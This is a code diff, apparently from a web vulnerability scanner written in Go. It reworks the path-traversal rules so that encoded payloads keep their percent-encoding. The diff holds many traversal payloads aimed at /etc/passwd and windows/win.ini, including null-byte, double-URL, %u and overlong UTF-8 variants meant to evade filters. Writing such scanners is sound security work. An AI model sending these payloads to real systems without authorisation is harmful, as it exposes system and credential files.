@@ -85,9 +85,11 @@ func (m *Module) ScanPerInsertionPoint(
 	var results []*output.ResultEvent
 
 	for _, rule := range m.rules {
-		for _, payload := range rule.Payloads() {
-			// Build fuzzed request with payload
-			fuzzedRaw := ip.BuildRequest([]byte(payload))
+		for _, rp := range rule.Payloads() {
+			payload := rp.value
+			// Build fuzzed request with payload; pre-encoded payloads keep their
+			// own percent-encoding (MISS-12).
+			fuzzedRaw := httpmsg.BuildPayload(ip, []byte(payload), rp.preEncoded)
 
 			// BuildRequest produces well-formed raw, so wrap directly instead
 			// of re-parsing on this hot path.
@@ -150,13 +152,7 @@ func getRules() []*rule {
 			"../../etc/passwd",
 			"../../../etc/passwd",
 			"../../../../etc/passwd",
-			"/etc/passwd%00.jpg",
 			"../../../../../../../../../../../../../../../etc/passwd",
-			"../../../../../../../../../../../../../../../etc/passwd%00.jpg",
-			`%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd`,
-			"%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002fetc%u002fpasswd",
-			"%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AFetc%C0%AFpasswd",
-			"%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AFetc%C0AFpasswd",
 			".../.../.../.../.../.../.../.../.../.../.../.../.../.../.../etc/passwd",
 			"./.././.././.././.././.././.././.././.././.././.././.././.././.././.././../etc/passwd",
 		},
@@ -171,6 +167,13 @@ func getRules() []*rule {
 			regexp.MustCompile(`root:[^:\r\n]{0,64}:0:0:[^:\r\n]{0,64}:[^:\r\n]{0,128}:[^\s:]`),
 		},
 		[]string{},
+	).withPreEncoded(
+		"/etc/passwd%00.jpg",
+		"../../../../../../../../../../../../../../../etc/passwd%00.jpg",
+		`%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd`,
+		"%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002fetc%u002fpasswd",
+		"%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AFetc%C0%AFpasswd",
+		"%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AFetc%C0AFpasswd",
 	)
 	rules = append(rules, linuxRule)
 	/* -------------------------------------------------------------------------- */
@@ -180,16 +183,6 @@ func getRules() []*rule {
 			"../../../windows/win.ini",
 			"../../../../windows/win.ini",
 			"../../../../../../../../../../../../../../../windows/win.ini",
-			"c:/windows/win.ini%00.jpg",
-			"../../../../../../../../../../../../../../../windows/win.ini%00.jpg",
-			// double url encode
-			`%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fwindows%252fwin.ini`,
-			// hex_unicode
-			"%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002fwindows%u002fwin.ini",
-			// utf8_unicode
-			"%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AFwindows%C0%AFwin.ini",
-			// utf8_unicode_x
-			"%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AFwindows%C0AFwin.ini",
 			// bypass_replace
 			".../.../.../.../.../.../.../.../.../.../.../.../.../.../.../windows/win.ini",
 			`..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\windows\win.ini`,
@@ -202,7 +195,18 @@ func getRules() []*rule {
 		// fired on any page that happened to contain them.
 		[]*regexp.Regexp{},
 		[]string{},
-	).withConfirm(confirmWinIni)
+	).withConfirm(confirmWinIni).withPreEncoded(
+		"c:/windows/win.ini%00.jpg",
+		"../../../../../../../../../../../../../../../windows/win.ini%00.jpg",
+		// double url encode
+		`%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fwindows%252fwin.ini`,
+		// hex_unicode
+		"%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002fwindows%u002fwin.ini",
+		// utf8_unicode
+		"%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AFwindows%C0%AFwin.ini",
+		// utf8_unicode_x
+		"%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AFwindows%C0AFwin.ini",
+	)
 	rules = append(rules, windowsRule)
 	/* ------------------------------------------------------------------------- */
 	webjarRule := newRule(
